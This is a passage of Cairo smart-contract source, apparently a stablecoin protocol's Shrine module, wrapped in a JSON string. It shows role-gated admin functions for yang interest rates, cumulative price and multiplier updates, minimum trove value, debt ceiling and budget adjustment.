self_snap.get_valid_yang_id(*yangs_copy.pop_front().unwrap());\n                        if *rate.val == USE_PREV_BASE_RATE {\n                            // Setting new era rate to the previous era's rate\n                            self\n                                .yang_rates\n                                .write(\n                                    (current_yang_id, rate_era),\n                                    self_snap.yang_rates.read((current_yang_id, rate_era - 1))\n                                );\n                        } else {\n                            assert_rate_is_valid(*rate);\n                            self.yang_rates.write((current_yang_id, rate_era), *rate);\n                        }\n                    },\n                    Option::None => { break; }\n                };\n            };\n\n            // Verify that all rates were updated correctly\n            // This is necessary because we don't enforce that the `yangs` array really contains\n            // every single yang, only that its length is the same as the number of yangs.\n            // For all we know, `yangs` could contain one yang address 10 times.\n            // Even though this is an admin/governance function, such a mistake could break\n            // interest rate calculations, which is why it's important that we verify that all yangs'\n            // rates were correctly updated.\n            let mut idx: u32 = num_yangs;\n            loop {\n                if idx == 0 {\n                    break ();\n                }\n                assert(self.yang_rates.read((idx, rate_era)).is_non_zero(), 'SH: Incorrect rate update');\n                idx -= 1;\n            };\n\n            self.emit(YangRatesUpdated { rate_era, current_interval, yangs, new_rates });\n        }\n\n        // Set the price of the specified Yang for the current interval interval\n        fn advance(ref self: ContractState, yang: ContractAddress, price: Wad) {\n            self.access_control.assert_has_role(shrine_roles::ADVANCE);\n\n            assert(price.is_non_zero(), 'SH: Price cannot be 0');\n\n            let interval: u64 = now();\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n\n            // Calculating the new cumulative price\n            // To do this, we get the interval of the last price update, find the number of\n            // intervals BETWEEN the current interval and the last_interval (non-inclusive), multiply that by\n            // the last price, and add it to the last cumulative price. Then we add the new price, `price`,\n            // for the current interval.\n            let (last_price, last_cumulative_price, last_interval) = self.get_recent_price_from(yang_id, interval - 1);\n\n            let cumulative_price: Wad = last_cumulative_price\n                + (last_price.val * (interval - last_interval - 1).into()).into()\n                + price;\n\n            self.yang_prices.write((yang_id, interval), (price, cumulative_price));\n            self.emit(YangPriceUpdated { yang, price, cumulative_price, interval });\n        }\n\n        // Sets the multiplier for the current interval\n        fn set_multiplier(ref self: ContractState, multiplier: Ray) {\n            self.access_control.assert_has_role(shrine_roles::SET_MULTIPLIER);\n\n            assert(multiplier.is_non_zero(), 'SH: Multiplier cannot be 0');\n            assert(multiplier.val <= MAX_MULTIPLIER, 'SH: Multiplier exceeds maximum');\n\n            let interval: u64 = now();\n            let (last_multiplier, last_cumulative_multiplier, last_interval) = self\n                .get_recent_multiplier_from(interval - 1);\n\n            let cumulative_multiplier = last_cumulative_multiplier\n                + ((interval - last_interval - 1).into() * last_multiplier.val).into()\n                + multiplier;\n            self.multiplier.write(interval, (multiplier, cumulative_multiplier));\n\n            self.emit(MultiplierUpdated { multiplier, cumulative_multiplier, interval });\n        }\n\n        fn set_minimum_trove_value(ref self: ContractState, value: Wad) {\n            self.access_control.assert_has_role(shrine_roles::SET_MINIMUM_TROVE_VALUE);\n\n            self.minimum_trove_value.write(value);\n\n            // Event emission\n            self.emit(MinimumTroveValueUpdated { value });\n        }\n\n        fn set_debt_ceiling(ref self: ContractState, ceiling: Wad) {\n            self.access_control.assert_has_role(shrine_roles::SET_DEBT_CEILING);\n            self.debt_ceiling.write(ceiling);\n\n            //Event emission\n            self.emit(DebtCeilingUpdated { ceiling });\n        }\n\n        fn adjust_budget(ref self: ContractState, amount: SignedWad) {\n            self.access_control.assert_has_role(shrine_roles::ADJUST_BUDGET);\n\n            self.adjust_budget_helper(amount);\n        }\n\n        // Updates spot price of yin\n        //\n        // Shrine denominates all prices (including that of yin) in yin, meaning yin's peg/target price is 1 (wad).\n        // Therefore, it's expected that the spot price is denominated in yin, in or"
    }
  ]
}